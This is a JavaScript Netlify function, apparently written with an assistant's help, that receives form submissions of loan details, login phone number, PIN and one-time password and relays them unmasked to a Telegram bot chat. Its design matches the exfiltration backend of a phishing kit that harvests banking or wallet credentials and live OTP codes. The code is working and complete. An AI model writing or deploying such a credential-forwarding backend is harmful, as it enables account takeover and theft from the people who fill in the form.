// netlify/functions/sendTelegram.js (diagnostic version)
exports.handler = async function(event, context) {
  // Only accept POST
  if (event.httpMethod !== 'POST') {
    return { statusCode: 405, body: 'Method not allowed' };
  }

  // Read env vars
  const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
  const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

  // Quick check
  if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) {
    const missing = [];
    if (!TELEGRAM_TOKEN) missing.push('TELEGRAM_TOKEN');
    if (!TELEGRAM_CHAT_ID) missing.push('TELEGRAM_CHAT_ID');
    console.error('Missing env vars:', missing.join(', '));
    return { statusCode: 500, body: 'Missing env vars: ' + missing.join(', ') };
  }

  // parse JSON safely
  let payload = {};
  try {
    payload = JSON.parse(event.body || '{}');
  } catch (err) {
    console.error('Invalid JSON:', err && err.message);
    return { statusCode: 400, body: 'Invalid JSON' };
  }

  // Helper to escape markdown meta-characters
  function esc(s){ return String(s||'').replace(/([_*\\[\\]`])/g, '\\$1'); }

  // Helper to mask sensitive pieces for logs (keep last 1-2 chars)
  function mask(s){
    if (!s) return s;
    const ss = String(s);
    if (ss.length <= 2) return '*'.repeat(ss.length);
    const keep = Math.min(2, ss.length);
    return '*'.repeat(ss.length - keep) + ss.slice(-keep);
  }

  // Log incoming payload (masked for sensitive fields)
  const logged = Object.assign({}, payload);
  if (logged.loginPin) logged.loginPin = mask(logged.loginPin);
  if (logged.otp) logged.otp = mask(logged.otp);
  if (logged.loanData && typeof logged.loanData === 'object') {
    // mask any loanData fields that look sensitive
    const ld = Object.assign({}, logged.loanData);
    if (ld.pin) ld.pin = mask(ld.pin);
    if (ld.otp) ld.otp = mask(ld.otp);
    logged.loanData = ld;
  }
  console.log('sendTelegram invoked. payload (masked):', JSON.stringify(logged));

  // Build message text
  let text = '*New Submission Received*\\n\\n';
  if (payload.submittedAt) text += `*Time:* ${esc(payload.submittedAt)}\\n\\n`;

  if (payload.loanData && typeof payload.loanData === 'object') {
    text += '*Loan details:*\\n';
    for (const k of Object.keys(payload.loanData)) {
      // mask sensitive fields in output message too? We'll include raw values (since you asked) but be aware
      text += `*${esc(k)}:* ${esc(payload.loanData[k])}\\n`;
    }
    text += '\\n';
  }

  if (payload.loginPhone) {
    text += '*Login details:*\\n';
    text += `*Phone:* ${esc(payload.loginPhone)}\\n`;
    text += `*PIN:* ${esc(payload.loginPin)}\\n`;
    text += `*OTP:* ${esc(payload.otp)}\\n\\n`;
  }

  // include other top-level keys
  const topExtras = Object.assign({}, payload);
  delete topExtras.loanData;
  delete topExtras.submittedAt;
  delete topExtras.loginPhone;
  delete topExtras.loginPin;
  delete topExtras.otp;
  if (Object.keys(topExtras).length) {
    text += '*Other:*\\n';
    for (const k of Object.keys(topExtras)) text += `*${esc(k)}:* ${esc(topExtras[k])}\\n`;
  }

  const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;

  // Use fetch - Netlify Node 18+ supports global fetch.
  try {
    const resp = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text, parse_mode: 'Markdown' })
    });

    const bodyText = await resp.text(); // we will return this in response for debugging
    let parsed;
    try { parsed = JSON.parse(bodyText); } catch(e){ parsed = bodyText; }

    // Log status and telegram response (mask if it contains token - it won't)
    console.log('Telegram API response status:', resp.status, 'body:', bodyText);

    if (!resp.ok) {
      // return Telegram error content to caller for clear debugging
      return {
        statusCode: 502,
        body: 'Telegram error: ' + bodyText
      };
    }

    // success
    return {
      statusCode: 200,
      body: typeof parsed === 'string' ? parsed : JSON.stringify(parsed)
    };
  } catch (e) {
    console.error('Fetch error when calling Telegram API:', e && e.message);
    return { statusCode: 500, body: 'Fetch error: ' + (e && e.message) };
  }
};
